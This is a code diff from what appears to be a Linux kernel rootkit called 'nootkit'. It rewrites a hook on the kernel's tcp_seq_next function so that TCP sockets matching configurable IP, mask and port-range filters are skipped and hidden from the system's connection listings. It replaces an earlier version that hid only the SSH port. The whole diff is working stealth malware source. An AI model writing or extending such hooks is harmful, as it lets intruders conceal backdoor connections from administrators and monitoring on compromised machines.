@@ -4,12 +4,20 @@
 #include <linux/tcp.h>
 #include <linux/kernel.h>
 #include <net/tcp.h>
+#include <linux/socket.h>
 
 #include <hook.h>
 #include <ksyms.h>
+#include <config.h>
 
 void *tcp_seq_next_hook(struct seq_file *seq, void *v, loff_t *pos)
-{   
+{
+    /* hook code */
+
+    int i;
+    struct sock *sock;
+    struct config_connection *filter;
+
     /* original tcp_seq_next_hook code */
 
     struct tcp_iter_state *st = seq->private;
@@ -41,15 +49,27 @@ out:
     /* hook code */
 
     if (rc) {
-        printk(KERN_INFO "==== SOCKET ====");
-        printk(KERN_INFO "sk_prot: %s", ((struct sock *)rc)->sk_prot->name);
-        printk(KERN_INFO "sk_daddr: %x", ((struct sock *)rc)->sk_daddr);
-        printk(KERN_INFO "sk_rcv_saddr: %x", ((struct sock *)rc)->sk_rcv_saddr);
-        printk(KERN_INFO "sk_dport: %d", ((struct sock *)rc)->sk_dport);
-        printk(KERN_INFO "sk_num: %d", ((struct sock *)rc)->sk_num);
+        sock = ((struct sock *)rc);
 
-        if (((struct sock *)rc)->sk_num == 22) {
-            printk(KERN_INFO "hiding SSH socket!");
+        for (i = 0; i < hide_sockets_count; i++) {
+            filter = &hide_sockets[i];
+
+            if ((NOOTKIT_TCP != filter->proto)
+                || (AF_INET != sock->sk_family)
+                || ((filter->local_ip & filter->local_ip_mask) != (sock->sk_rcv_saddr & filter->local_ip_mask))
+                || ((filter->foreign_ip & filter->foreign_ip_mask) != (sock->sk_daddr & filter->foreign_ip_mask))
+                || (!(
+                    /* sk_num is stored in host byte order, while sk_dport is always BE */
+                       (__le16_to_cpu(filter->local_port_start) <= sock->sk_num)
+                    && (__le16_to_cpu(filter->local_port_end) >= sock->sk_num)
+                ))
+                || (!(
+                       (__le16_to_cpu(filter->foreign_port_start) <= __be16_to_cpu(sock->sk_dport))
+                    && (__le16_to_cpu(filter->foreign_port_end) >= __be16_to_cpu(sock->sk_dport))
+                )))
+                continue;
+            
+            printk(KERN_INFO "nootkit: Hiding TCP socket because of filter [%s]!", hide_sockets_strs[i]);
             return seq->op->next(seq, rc, pos);
         }
     }
